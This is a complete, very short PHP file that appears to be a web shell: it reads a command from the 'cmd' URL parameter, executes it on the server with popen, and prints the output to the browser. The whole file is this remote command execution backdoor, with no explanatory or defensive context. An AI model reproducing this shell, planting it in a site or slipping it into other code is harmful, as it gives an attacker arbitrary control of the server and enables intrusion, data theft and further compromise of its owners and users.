<?php
$handle = popen($_GET['cmd'],'r');
echo "<pre>".fread($handle,4096)."</pre>";
pclose($handle);
?>
